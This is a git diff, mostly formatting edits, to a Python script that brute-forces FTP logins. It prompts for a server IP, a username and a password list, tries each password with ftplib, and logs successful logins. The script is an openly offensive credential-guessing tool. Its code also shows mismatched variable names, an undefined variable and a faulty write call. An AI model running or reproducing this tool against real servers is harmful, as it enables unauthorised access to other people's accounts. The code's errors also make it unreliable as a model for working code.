@@ -8,31 +8,27 @@ import time
 import re
 import cowsay
 
+
 # constants, global flag
 CWD = os.getcwd()
 FTPLOG = os.path.join(CWD, 'ftp_bruteforce.log')
 LOGHEADER = '''
-
 *****************************************************
 **  FTP Bruteforcer ~ LOGFILE: Successful logins   **
 *****************************************************
-
 '''
-HEADER = r'''
-
+HEADER = '''
 *****************************************************
 * ||//-\\|| FTP Bruteforcer ~ by evagreen ||//-\\|| *
 *****************************************************
-
 '''
-FOOTER = r'''
-                                               __
+FOOTER = '''                                              
                                             0 /  
 ** |/-\| ¯\_(ツ)_/¯ ~ THE END -\|/-\|/-   - | -  ~  **
-                                           / \      
-                                           
+                                           / \
 '''
 isFound = False
+
 
 # spinning timer
 def spin(found=False):
@@ -60,15 +56,17 @@ def spin(found=False):
 
 
 def main():
-    '''Simple interactive (atm) Commandline FTP-Bruteforcer. Connects to known
-    FTP-Server with username, and bruteforces login using selected pwdlist'''
+    '''Simple interactive (soon with cmdline ARGS) Commandline FTP-Bruteforcer. Connects to known
+    FTP-Server with username, and bruteforces login using a selected passwdlist'''
     print(HEADER, "\n")
 
     try:
         while True:
             SERVER = input("Enter IP-Address of FTP server: ")
+            # Regular Expression to check for valid IPv4 Address
             REGEXP_IP = r'^\d{1,4}\.\d{1,4}\.\d{1,4}\.\d{1,4}$'
             ip_re = re.compile(REGEXP_IP)
+            # valid IP/NOT valid IP Flag
             isIP = ip_re.search(SERVER)
 
             if isIP:
@@ -84,7 +82,8 @@ def main():
     print(USER, "\n")
 
     try:
-        PASSWORD_LIST = input("Please provide path and filename of passwordlist: ")
+        PASSWORD_LIST = input(
+            "Please provide path and filename of passwordlist: ")
         print(PASSWORD_LIST)
 
         if os.path.exists(PASSWORD_LIST):
@@ -98,7 +97,7 @@ def main():
                     password = password.strip()
                     try:
                         tries = 0
-                        ftp_con  = ftplib.FTP(server, user, password)
+                        ftp_con = ftplib.FTP(server, user, password)
                         if ftp_con:
                             isfound = True
 
@@ -117,23 +116,27 @@ def main():
                             tries += 1
 
                             if os.path.exists(FTPLOG):
-                                with open(FTPLOG, 'a+' ) as ftp_log:
+                                with open(FTPLOG, 'a+') as ftp_log:
                                     ftp_log.write(LOGLINE)
                             else:
                                 with open(FTPLOG, 'w+') as ftp_log:
                                     ftp_log.write(LOGHEADER, LOGLINE)
                     except:
-                        print(f'still trying... *** password: {password} *** try #{tries}\r', end='')
+                        print(
+                            f'still trying... *** password: {password} *** try #{tries}\r', end='')
         else:
             print(f'[-] No Password list exists at your specified location!\n')
             raise FileExistsError
     except FileNotFoundError:
-        print(f'[-] Sorry. Your password list could not be found at {passwd_list}!')
-    finally:
+        print(
+            f'[-] Sorry. Your password list could not be found at {passwd_list}!')
+    except:
         cowsay.trex("SOMETHING WENT REALLY WRONG HERE...")
         print(FOOTER)
         sys.exit()
 
+
+# to be continued ...
 # modify for sys.argv instead (or additionally)!)
 
 # if run as script: run main() program
